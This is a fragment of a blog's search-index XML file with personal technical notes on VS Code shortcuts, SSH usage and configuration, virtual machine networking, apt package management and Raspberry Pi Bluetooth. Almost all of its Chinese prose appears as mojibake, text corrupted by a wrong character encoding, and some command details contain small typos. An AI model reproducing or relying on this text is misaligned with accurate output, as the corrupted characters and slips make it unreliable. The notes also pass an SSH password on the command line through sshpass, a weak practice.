href="https://segmentfault.com/q/1010000004107293">ã€1ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode-keymap.md</title>
      <link href="/post/vscode-keymap.html"/>
      <url>/post/vscode-keymap.html</url>
      
        <content type="html"><![CDATA[<p>cmd + b æ‰“å¼€å…³é—­å·¦ä¾§è¾¹æ <br>cmd + j æ‰“å¼€ä¸‹é¢é¢æ¿<br>shift + alt + f æ ¼å¼åŒ–ä»£ç     </p><p>shift + cmd + k åˆ é™¤ä¸€è¡Œ    </p><p>cmd + right å…‰æ ‡åˆ°æœ€å³<br>cmd + left å…‰æ ‡æœ€å·¦    </p><p>shift + cmd + left é€‰ä¸­å…‰æ ‡ä»¥å·¦<br>shift + cmd + right é€‰ä¸­å…‰æ ‡ä»¥å³<br>shift + cmd + c å¯åŠ¨å‘½ä»¤è¡Œ </p><p>cmd + down å…‰æ ‡åˆ°æœ€å<br>cmd + up å…‰æ ‡åˆ°å¼€å§‹<br>cmd + right å…‰æ ‡åˆ°æœ€å³<br>cmd + left å…‰æ ‡åˆ°æœ€å·¦<br>shift + cmd + up é€‰ä¸­å…‰æ ‡å¤„åˆ°å¼€å§‹<br>shift + cmd + down é€‰ä¸­å…‰æ ‡å¤„åˆ°ç»“æŸ<br>shift + cmd + alt + down å‘ä¸‹é€‰ç€å¤šè¡Œï¼ˆå¤šè¡Œç¼–è¾‘ï¼‰<br>shift + cmd + alt + left&#x2F;right å¤šè¡Œç¼–è¾‘    </p><p>alt + left å‘å·¦è·³è¿‡ä¸€ä¸ªå•è¯<br>alt + right å‘å³è·³è¿‡ä¸€ä¸ªå•è¯    </p><p>cmd + del åˆ é™¤å…‰æ ‡å·¦è¾¹å·¦å³å•è¯<br>ctrl + k åˆ é™¤å…‰æ ‡å³è¾¹æ‰€æœ‰å•è¯ (cmd + fn + del)    </p><p>delete åˆ é™¤å·¦è¾¹ä¸€ä¸ªå­—æ¯<br>fn + delete åˆ é™¤å³è¾¹ä¸€ä¸ªå­—æ¯    </p><p>cmd + i å‘ä¸‹é€‰ç€ä¸€è¡Œ<br>cmd + g ä¸‹ä¸€ä¸ªæŸ¥æ‰¾å¾—åˆ°çš„å•è¯    </p><p>ctrl + g è·³è½¬åˆ°è¡Œ    </p><p>shift + cmd + l æ‰€æœ‰é€‰ä¸­å•è¯é«˜äº®    </p><p>ctrl + o å…‰æ ‡å¤„æ–­è¡Œæ’å…¥<br>shift + cmd + enter ä¸Šé¢æ’å…¥ä¸€è¡Œ<br>cmd + enter ä¸‹é¢æ’å…¥ä¸€è¡Œ    </p><p>cmd + z æ’¤é”€<br>cmd + shift + z æ¢å¤    </p><p>shift + alt + a å¤šè¡Œæ³¨é‡Š ï¼ˆcmd + &#x2F;ï¼‰    </p><p>cmd + [ å·¦ç§»<br>cmd + ] å³ç§»<br>cmd + \ åˆ‡åˆ†çª—å£    </p><p>shift + cmd + v é¢„è§ˆ    </p><p>cmd + k o æ–°çª—å£æ‰“å¼€å½“å‰æ–‡ä»¶<br>cmd + k m åˆ‡æ¢è¯­è¨€æ¨¡å¼<br>cmd + k p å¤åˆ¶å½“å‰æ–‡ä»¶è·¯å¾„<br>cmd + k r åœ¨æ–‡ä»¶ç®¡ç†å™¨ä¸­æ‰“å¼€å½“å‰æ–‡ä»¶<br>cmd + k v é¢„è§ˆ<br>cmd + k left å½“å‰çª—å£å·¦ç§»<br>cmd + k right å½“å‰çª—å£å³ç§»<br>cmd + k w å…³é—­å½“å‰æ–‡ä»¶ (cmd + w)    </p><p>cmd + p å¿«é€Ÿæ‰“å¼€æ–‡ä»¶(cmd + e)<br>ctrl + tal å¿«é€Ÿæ‰“å¼€æ–‡ä»¶å¹¶æŒ‰tabåˆ‡æ¢æ–‡ä»¶    </p><p>alt + up ç§»åŠ¨å½“å‰è¡Œå‘ä¸Š<br>alt + down ç§»åŠ¨å½“å‰è¡Œå‘ä¸‹    </p><p>shift + cmd + [ æŠ˜å ä»£ç <br>shift + cmd + ] æ‰“å¼€ä»£ç     </p><p>alt + cmd + o å¯¼å…¥Go package    </p><p>ctrl + - åé€€</p><p>shift + cmd + space å‡½æ•°å‚æ•°æç¤º</p><p>alt + â¬† ä¸Šç§»ä¸€è¡Œ</p><p>shift + alt + â¬† å¤åˆ¶å½“å‰è¡Œåˆ°ä¸Šé¢</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSH</title>
      <link href="/post/SSH.html"/>
      <url>/post/SSH.html</url>
      
        <content type="html"><![CDATA[<h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><ol><li>SSHç™»å½•æ—¶æŒ‡å®šç§é’¥</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@ip -i ./xxx/privateKey -p prot</span><br></pre></td></tr></table></figure><ol start="2"><li>SSHä»£ç†</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -L -f 0.0.0.0:3306:127.0.0.1:3306 user@host </span><br></pre></td></tr></table></figure><ul><li>-N åªå‘é€æ•°æ®ä¸è¿æ¥</li><li>-L æ˜ å°„  localhost:localport:remotehost:remoteport ä»£ç†ä¸»æœº</li><li>-f åå°è¿è¡Œ</li></ul><p>ç»è¿‡æœ¬æœº<code>3306</code>ç«¯å£çš„æµé‡éƒ½ç»<code>user@host</code>æœºå™¨è½¬å‘åˆ°<code>127.0.0.1:3306</code>ä¸Šå»</p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>åœ¨.sshæ–‡ä»¶å¤¹ä¸‹æ–°å»º<code>config</code>æ–‡ä»¶ï¼Œç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Host www</span><br><span class="line">    HostName 192.168.1.111</span><br><span class="line">    Port 50</span><br><span class="line">    User root</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_2048</span><br><span class="line"></span><br><span class="line"># gitæŒ‡å®šç§é’¥</span><br><span class="line">Host api</span><br><span class="line">    HostName api.domain.com</span><br><span class="line">    User git</span><br><span class="line">    Port 22</span><br><span class="line">    IdentityFile ~/.ssh/git_id_rsa</span><br></pre></td></tr></table></figure><p>è®¿é—®çš„æ—¶å€™åªéœ€è¿è¡Œ<code>ssh www</code>å°±èƒ½è®¿é—®<code>192.168.1.111</code>æœåŠ¡å™¨äº†</p><h3 id="SSHé…ç½®"><a href="#SSHé…ç½®" class="headerlink" title="SSHé…ç½®"></a>SSHé…ç½®</h3><p>&#x2F;etc&#x2F;ssh&#x2F;sshd_config</p><ol><li><p>ç¦æ­¢å¯†ç ç™»å½•</p><p> vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication no </span><br></pre></td></tr></table></figure><p> ä¿®æ”¹åé‡æ–°åŠ è½½é…ç½®</p></li><li><p>é¿å…è‡ªåŠ¨æ–­å¼€</p><p> vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 60s ä¸€æ¬¡å¿ƒè·³</span><br><span class="line">ClientAliveInterval 60</span><br><span class="line"># 5 æ¬¡å¤±è´¥åè‡ªåŠ¨æ®µè€ƒ</span><br><span class="line">ClientAliveCountMax 5 </span><br></pre></td></tr></table></figure><p> ä¿®æ”¹åé‡æ–°åŠ è½½é…ç½®</p></li></ol><h3 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a>å¸¸è§é—®é¢˜</h3><ol><li><p>å·²ç»åœ¨<code>authorized_keys</code>åŠ å…¥è¿‡publicKeyï¼Œä½†æ˜¯è¿˜æ˜¯è¦æ±‚è¾“å…¥å¯†ç ã€‚</p><blockquote><p>æƒé™é—®é¢˜ï¼Œä¸€èˆ¬.sshç›®å½•çš„æ–‡ä»¶æƒé™ä¸º<code>600</code>ã€‚</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 authorized_keys</span><br><span class="line">restorecon -r -vv /root/.ssh</span><br></pre></td></tr></table></figure></blockquote></li><li><p><code>ssh-copy-id</code> å‘½ä»¤<br> <code>ssh-copy-id</code>å‘½ä»¤å¯ä»¥æŠŠæœ¬åœ°ä¸»æœºçš„å…¬é’¥å¤åˆ¶åˆ°è¿œç¨‹ä¸»æœºçš„ authorized_keys æ–‡ä»¶ä¸Šï¼Œssh-copy-id å‘½ä»¤ä¹Ÿä¼šç»™è¿œç¨‹ä¸»æœºçš„ç”¨æˆ·ä¸»ç›®å½•ï¼ˆhomeï¼‰å’Œ <del>&#x2F;.ssh, å’Œ</del>&#x2F;.ssh&#x2F;authorized_keysè®¾ç½®åˆé€‚çš„æƒé™ã€‚</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id user@server</span><br><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub user@server</span><br></pre></td></tr></table></figure></li><li><p><code>sshpass</code> è¾“å…¥å¯†ç <br> ssh ç™»å½•æ—¶ä¸èƒ½æŒ‡å®šå¯†ç ï¼Œæœ‰æ—¶é—´å¾ˆä¸æ–¹ä¾¿ã€‚ä½¿ç”¨ sshpass å¯ä»¥æ¥å¤„ç†è¿™ä¸ªé—®é¢˜ã€‚</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshpass -p &#x27;passwd&#x27; ssh user@domain</span><br></pre></td></tr></table></figure></li><li><p>è¿æ¥è‡ªåŠ¨æ–­å¼€<br> ä¿®æ”¹<code>/etc/ssh/sshd_config</code> <code>ClientAliveInterval</code>å’Œ<code>ClientAliveInterval</code>å‚æ•°</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># æŒ‡å®šäº†æœåŠ¡å™¨ç«¯å‘å®¢æˆ·ç«¯è¯·æ±‚æ¶ˆæ¯çš„æ—¶é—´é—´éš”ã€‚é»˜è®¤æ˜¯0ï¼Œä¸å‘é€ï¼Œè€ŒClientAliveInterval 60è¡¨ç¤ºæ¯åˆ†é’Ÿå‘é€ä¸€æ¬¡ã€‚</span><br><span class="line">ClientAliveInterval 60</span><br><span class="line"># ClientAliveCountMaxè¡¨ç¤ºæœåŠ¡å™¨å‘å‡ºè¯·æ±‚åå®¢æˆ·ç«¯æ²¡æœ‰å“åº”çš„æ¬¡æ•°è¾¾åˆ°ä¸€å®šå€¼, å°±è‡ªåŠ¨æ–­å¼€ã€‚</span><br><span class="line">ClientAliveCountMax 3</span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://segmentfault.com/q/1010000000445726">CentOS SSHå…¬é’¥ç™»å½•é—®é¢˜</a></li><li><a href="http://serverfault.com/questions/321534/public-key-authentication-fails-only-when-sshd-is-daemon">public key authentication fails ONLY when sshd is daemon</a></li><li><a href="https://web.archive.org/web/20170801031147/http://www.cnblogs.com/qcly/archive/2013/07/27/3219535.html">ä¸€æ¬¡ç”±SELinuxå¼•èµ·çš„sshå…¬é’¥è®¤è¯å¤±è´¥é—®é¢˜</a> </li><li><a href="http://www.2cto.com/os/201212/173257.html">sshå…å¯†ç ç™»å½•(å…¬é’¥ç™»å½•)å¤±è´¥çš„åŸå› </a> </li><li><a href="http://blog.csdn.net/wangjunjun2008/article/details/19993395">Linuxå‘½ä»¤ä¹‹éäº¤äº’SSHå¯†ç éªŒè¯-sshpass</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è™šæ‹Ÿæœºç½‘ç»œ</title>
      <link href="/post/virtual-machine-network.html"/>
      <url>/post/virtual-machine-network.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>bridged(æ¡¥æ¥æ¨¡å¼)<br>ä»€ä¹ˆæ˜¯æ¡¥æ¥æ–¹å¼è¿æ¥ï¼Œæˆ‘æ‰“ä¸ªæ¯”å–»ï¼Œæ¡¥æ¥å°±ç›¸å½“äºå…„å¼Ÿä¸€æ ·æ˜¯å¹¶åˆ—çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨æ¡¥æ¥æ—¶ï¼Œè™šæ‹Ÿæœºçš„IPç½‘æ®µå’Œä¸»æœºçš„ç½‘æ®µæ˜¯ä¸€æ ·çš„ã€‚</p></li><li><p>NAT(ç½‘ç»œåœ°å€è½¬æ¢æ¨¡å¼)<br>NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰ NATæ˜¯network address translateçš„ç®€ç§°ï¼Œä»€ä¹ˆæ˜¯NATæ–¹å¼è¿æ¥ï¼ŒNATå°±ç›¸å½“äºçˆ¶å­å…³ç³»ä¸€æ ·ï¼Œä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨NATæ—¶ï¼Œæœ¬åœ°ä¸»æœºå°±ç›¸å½“äºè™šæ‹Ÿæœºçš„ç½‘å…³ã€‚</p></li><li><p>host-only(ä¸»æœºæ¨¡å¼)<br>Host-only ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´çš„ç½‘ç»œäº’è®¿, ä½†è™šæ‹Ÿæœºè®¿é—®ä¸äº†internetã€‚</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>apt</title>
      <link href="/post/apt.html"/>
      <url>/post/apt.html</url>
      
        <content type="html"><![CDATA[<h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><ul><li>apt-get</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">åƒæ•¸ï¼š</span><br><span class="line">-q ï¼šä¸è¦åœ¨è¢å¹•ä¸Šè¼¸å‡ºè¨Šæ¯ï¼Œå¸¸ç”¨åœ¨èƒŒæ™¯ç’°å¢ƒçš„åŸ·è¡Œç•¶ä¸­å–”ï¼</span><br><span class="line">-y ï¼šè‡ªå‹•åœ¨é€²è¡Œ apt-get æ™‚å›ç­” y çš„å›æ‡‰ï¼›</span><br><span class="line">-c ï¼šå¾Œé¢æ¥çš„æ˜¯è¨­å®šæª”ï¼Œä¸€èˆ¬ç³»çµ±æœƒä¸»å‹•çš„ä»¥ /etc/apt å…§çš„è¨­å®šæª”ç‚ºä¾æ“šã€‚</span><br><span class="line">[æ›´æ–°é …ç›®]ï¼šè¦ apt-get é€²è¡Œçš„å·¥ä½œï¼Œä¸»è¦æœ‰é€™å¹¾é …ï¼š</span><br><span class="line">   update      ï¼šå°±æ˜¯æ›´æ–°ä¼ºæœå™¨èˆ‡ç”¨æˆ¶ç«¯çš„å¥—ä»¶è¡¨é ­æ¸…å–®ï¼Œé€™å€‹å‹•ä½œå‹™å¿…è¦é€²è¡Œï¼</span><br><span class="line">   install     ï¼šå¾Œé¢éœ€è¦åŠ ä¸Šè¦å®‰è£çš„å¥—ä»¶åç¨±æ‰è¡Œï¼</span><br><span class="line">   upgrade     ï¼šé€²è¡Œã€å·²å®‰è£å¥—ä»¶ã€çš„å®Œæ•´å‡ç´šï¼Œä¸éæœªå®‰è£å¥—ä»¶å‰‡ä¸äºˆå®‰è£ï¼›</span><br><span class="line">   dist-upgradeï¼šä»¥ upgrade ç›¸ä¼¼ï¼Œä½†æ˜¯ç•¶æ–°ç‰ˆæœ¬çš„å¥—ä»¶æœ‰å…¶ä»–ç›¸ä¾å±¬æ€§çš„å¥—ä»¶åŠ å…¥æ™‚ï¼Œ</span><br><span class="line">                 å–®ç´”çš„ upgrade å°‡ç„¡æ³•é€²è¡Œå®‰è£ï¼Œæ­¤æ™‚å°±å¾—è¦ä½¿ç”¨ dist-upgrade äº†ï¼</span><br><span class="line">   clean       ï¼šæ¸…é™¤å·²ç¶“ä¸‹è¼‰åˆ° /var/cache/apt/archives/ çš„å¥—ä»¶æª”æ¡ˆã€‚</span><br><span class="line">   remove      ï¼šç§»é™¤æŸå€‹å¥—ä»¶å•Šï¼</span><br></pre></td></tr></table></figure><p><em>é‚£å€‹ update çš„åƒæ•¸ä¸¦ä¸æ˜¯åœ¨é€²è¡Œæ›´æ–°ï¼Œ è€Œæ˜¯åœ¨é€²è¡Œä¼ºæœå™¨èˆ‡ç”¨æˆ¶ç«¯çš„å¥—ä»¶è¡¨é ­æ¸…å–®æ›´æ–°è€Œå·²ï¼Œ ä½†é€™å€‹å‹•ä½œç›¸ç•¶é‡è¦ï¼Œå¦‚æœä½ æ²’æœ‰ä½œé€™å€‹å‹•ä½œçš„è©±ï¼Œä½ çš„å¥—ä»¶å°±ä¸æœƒæ›´æ–°äº†ï¼ åœ¨ apt-get update å¾Œï¼Œå†ä½¿ç”¨ apt-get dist-upgrade é€™æ¨£å°±èƒ½å¤ å°‡æ•´å€‹ç³»çµ±çµ¦ä»–å‡ç´šäº†ï¼</em></p><ul><li>apt-cache</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">åƒæ•¸ï¼š</span><br><span class="line">[æœå°‹é …ç›®]ï¼šapt-cache å¯ä»¥æœå°‹ apt æ‰€åˆ—å‡ºçš„å¥—ä»¶æ¨™é ­è³‡æ–™å–”ï¼å¯ç”¨é …ç›®æœ‰ï¼š</span><br><span class="line">pkgnamesï¼šåˆ—å‡ºæœ¬ç³»çµ±ä¸Šé¢çš„æ‰€æœ‰å¥—ä»¶åç¨±ï¼ï¼æœ‰é»é¡ä¼¼ (rpm -qa)ï¼›</span><br><span class="line">dump    ï¼šåˆ—å‡ºæ‰€æœ‰çš„å¥—ä»¶æ¨™é ­ä»¥åŠå…¶ç›¸é—œçš„ç›¸ä¾å±¬æ€§å¥—ä»¶ï¼</span><br><span class="line">search  ï¼šå¾Œé¢å¯æ¥è¦æœå°‹çš„å­—ä¸²ï¼Œä¾‹å¦‚ apt-cache search postfix</span><br><span class="line">show    ï¼šå¾Œé¢æ¥å¥—ä»¶åç¨±ï¼Œå¯ä»¥é¡¯ç¤ºå‡ºè©²å¥—ä»¶çš„ä¸»è¦å…§å®¹çš„æè¿°ï¼</span><br><span class="line">showpkg ï¼šåˆ—å‡ºå¾Œé¢æ‰€æ¥å¥—ä»¶çš„ç›¸ä¾å±¬æ€§ä»¥è©²å…¶å¥—ä»¶æä¾›çš„ç›¸é—œåŠŸèƒ½ï¼</span><br><span class="line">depends ï¼šå¯ä»¥åˆ—å‡ºèˆ‡å¾Œé¢æ‰€æ¥å¥—ä»¶æœ‰ç›¸ä¾å±¬æ€§æˆ–è€…æ˜¯è¡çªçš„ç›¸é—œè³‡æ–™ï¼</span><br></pre></td></tr></table></figure><h3 id="æºé…ç½®"><a href="#æºé…ç½®" class="headerlink" title="æºé…ç½®"></a>æºé…ç½®</h3><p>æ–‡ä»¶&#x2F;etc&#x2F;apt&#x2F;sources.listæ˜¯ä¸€ä¸ªæ™®é€šå¯ç¼–è¾‘çš„æ–‡æœ¬æ–‡ä»¶ï¼Œä¿å­˜äº†ubuntuè½¯ä»¶æ›´æ–°çš„æºæœåŠ¡å™¨çš„åœ°å€ã€‚å’Œsources.liståŠŸèƒ½ä¸€æ ·çš„æ˜¯&#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;*.list(<em>ä»£è¡¨ä¸€ä¸ªæ–‡ä»¶åï¼Œåªèƒ½ç”±å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€è‹±æ–‡å¥å·ç»„æˆ)ã€‚sources.list.dç›®å½•ä¸‹çš„</em>.listæ–‡ä»¶ä¸ºåœ¨å•ç‹¬æ–‡ä»¶ä¸­å†™å…¥æºçš„åœ°å€æä¾›äº†ä¸€ç§æ–¹å¼ï¼Œé€šå¸¸ç”¨æ¥å®‰è£…ç¬¬ä¸‰æ–¹çš„è½¯ä»¶ã€‚  </p><p>æ¯ä¸€è¡Œçš„å¼€å¤´æ˜¯debæˆ–è€…deb-srcï¼Œåˆ†åˆ«è¡¨ç¤ºç›´æ¥é€šè¿‡.debæ–‡ä»¶è¿›è¡Œå®‰è£…å’Œé€šè¿‡æºæ–‡ä»¶çš„æ–¹å¼è¿›è¡Œå®‰è£…ã€‚<br>debæˆ–è€…deb-srcå­—æ®µä¹‹åï¼Œæ˜¯ä¸€æ®µURLï¼Œä¹‹åæ˜¯äº”ä¸ªç”¨ç©ºæ ¼éš”å¼€çš„å­—ç¬¦ä¸²ï¼Œåˆ†åˆ«å¯¹åº”ç›¸åº”çš„ç›®å½•ç»“æ„ã€‚åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ <a href="http://archive.ubuntu.com/ubuntu/">http://archive.ubuntu.com/ubuntu/</a> ï¼Œå¹¶è¿›å…¥distsç›®å½•ï¼Œå¯ä»¥å‘ç°æœ‰5ä¸ªç›®å½•å’Œå‰è¿°sources.listæ–‡ä»¶ä¸­çš„ç¬¬ä¸‰åˆ—å­—æ®µç›¸å¯¹åº”ã€‚ä»»é€‰å…¶ä¸­ä¸€ä¸ªç›®å½•è¿›å…¥ï¼Œå¯ä»¥çœ‹åˆ°å’Œsources.liståå››åˆ—ç›¸å¯¹åº”çš„ç›®å½•ç»“æ„ã€‚</p><p>æ ‘è“æ´¾aptæº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi</span><br></pre></td></tr></table></figure><h3 id="å›½å†…çš„aptæº"><a href="#å›½å†…çš„aptæº" class="headerlink" title="å›½å†…çš„aptæº"></a>å›½å†…çš„aptæº</h3><ol><li><a href="http://mirrors.aliyun.com/">é˜¿é‡Œ</a></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://linux.vbird.org/linux_server/0210network-secure/0220upgrade.php#apt_config">ã€1ã€‘</a><a href="http://www.tuicool.com/articles/EjMJNz/">ã€2ã€‘</a><a href="http://outofmemory.cn/code-snippet/35699/raspberry-pi-apt-get-source-list">ã€3ã€‘</a><a href="http://shumeipai.nxez.com/2013/08/31/raspbian-chinese-software-source.html">ã€4ã€‘</a><a href="https://www.raspbian.org/RaspbianMirrors">ã€5ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> apt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ‘è“æ´¾è“ç‰™</title>
      <link href="/post/raspberry-pi-bluetooth.html"/>
      <url>/post/raspberry-pi-bluetooth.html</url>
      
        <content type="html"><![CDATA[<h3 id="Linuxä¸­è“ç‰™ç®¡ç†"><a href="#Linuxä¸­è“ç‰™ç®¡ç†" class="headerlink" title="Linuxä¸­è“ç‰™ç®¡ç†"></a>Linuxä¸­è“ç‰™ç®¡ç†</h3><p>è“ç‰™ç®¡ç†å·¥å…·<code>bluetoothctl</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">list               æ˜¾ç¤ºæœºå™¨ä¸Šçš„è“ç‰™è®¾å¤‡</span><br><span class="line">show [ctrl]        æ˜¾ç¤ºæœºå™¨ä¸Šè“ç‰™çŠ¶æ€ä¿¡æ¯</span><br><span class="line">select &lt;ctrl&gt;      é€‰ç€ä¸€ä¸ªè“ç‰™è®¾å¤‡</span><br><span class="line">devices            åˆ—å‡ºæ‰€æœ‰çš„è“ç‰™è®¾å¤‡</span><br><span class="line">paired-devices     åˆ—å‡ºä¸€é…å¯¹çš„è®¾å¤‡</span><br><span class="line">power &lt;on/off&gt;     æ‰“å¼€è“ç‰™</span><br><span class="line">pairable &lt;on/off&gt;  è®¾ç½®è®¾å¤‡æ˜¯å¦å¯ä»¥é…å¯¹</span><br><span class="line">discoverable &lt;on/off&gt;  è®¾ç½®æ˜¯å¦å¯è§</span><br><span class="line">agent &lt;on/off/capability&gt;  Enable/disable agent with given capability</span><br><span class="line">default-agent  Set agent as the default one</span><br><span class="line">scan &lt;on/off&gt;     æ‰«æè®¾å¤‡</span><br><span class="line">info &lt;dev&gt;        è®¾å¤‡ä¿¡æ¯</span><br><span class="line">pair &lt;dev&gt;        é…å¯¹</span><br><span class="line">trust &lt;dev&gt;       ä¿¡ä»»è®¾å¤‡</span><br><span class="line">untrust &lt;dev&gt;     Untrust device</span><br><span class="line">block &lt;dev&gt;       æ‹‰é»‘è®¾å¤‡</span><br><span class="line">unblock &lt;dev&gt;     Unblock device</span><br><span class="line">remove &lt;dev&gt;      åˆ é™¤ä¸€ä¸ªè®¾å¤‡</span><br><span class="line">connect &lt;dev&gt;     è¿æ¥è®¾å¤‡</span><br><span class="line">disconnect &lt;dev&gt;  æ–­å¼€</span><br><span class="line">version           Display version</span><br><span class="line">quit              Quit program</span><br></pre></td></tr></table></figure><p><code>service bluetooth status</code>æŸ¥çœ‹è“ç‰™æœåŠ¡çŠ¶æ€</p><p>é—®é¢˜ï¼š</p><ol><li>connect æŠ¥é”™<br><img src="/./images/bluetooth-connect.png"></li></ol><p>è¡¥å……ï¼š<br>bluetoothctrl connect æŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[bluetooth]# connect 22:22:04:EE:32:B0</span><br><span class="line">Attempting to connect to 22:22:04:EE:32:B0</span><br><span class="line">Failed to connect: org.bluez.Error.Failed</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install pulseaudio pulseaudio-module-bluetooth pavucontrol</span><br><span class="line">pulseaudio --start</span><br></pre></td></tr></table></figure><p>å‚è€ƒ<a href="https://wiki.archlinux.org/index.php/Bluetooth_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">ã€1ã€‘</a> <a href="http://unix.stackexchange.com/questions/258074/error-when-trying-to-connect-to-bluetooth-speaker-org-bluez-error-failed">ã€2ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RaspberryPi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ‘è“æ´¾æ‘„åƒå¤´æŒ‚è½½</title>
      <link href="/post/raspberry-pi-camera.html"/>
      <url>/post/raspberry-pi-camera.html</url>
      
